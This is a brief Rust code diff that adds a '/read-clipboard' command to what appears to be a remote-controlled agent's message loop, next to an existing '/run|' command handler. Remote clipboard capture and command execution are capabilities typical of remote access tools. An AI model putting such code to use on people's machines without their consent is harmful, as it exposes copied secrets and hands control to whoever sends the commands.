@@ -200,8 +200,18 @@ async fn main() {
 
         for message in messages {
 
-
             let mut interpreted = (async || {
+                if message.request == "/read-clipboard" {
+                    match helpers::read_clipboard() {
+                        Ok(data) => {
+                            return data;
+                        },
+                        Err(e) => {
+                            return e.to_string();
+                        },
+                    };
+                }
+
                 if message.request.starts_with("/run|") {
                     let parts: Vec<&str> = message.request.split("|").collect();
                     if parts.len() != 2 {
